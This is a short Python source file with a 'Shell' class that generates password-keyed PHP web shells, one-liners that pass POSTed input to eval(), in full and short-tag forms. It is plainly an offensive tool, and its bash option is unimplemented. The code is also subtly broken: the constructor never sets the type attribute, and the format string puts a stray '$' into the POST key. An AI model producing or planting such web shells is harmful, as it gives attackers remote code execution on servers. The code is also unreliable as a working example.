#!/usr/bin/env python
# -*- coding: utf-8 -*-

class Shell(object):

    """
    Generate Shell for use
    """
    
    def __init__(self, stype):
        super(Shell, self).__init__()
    
    def generate(self, pwd, short=False):
        if self.type == "php":
            if short:
                return "<? eval($_POST['$%s'])?>" % pwd
            return  "<?php eval($_POST['$%s'])?>" % pwd
        if self.type == "bash":
            return "not implement yet"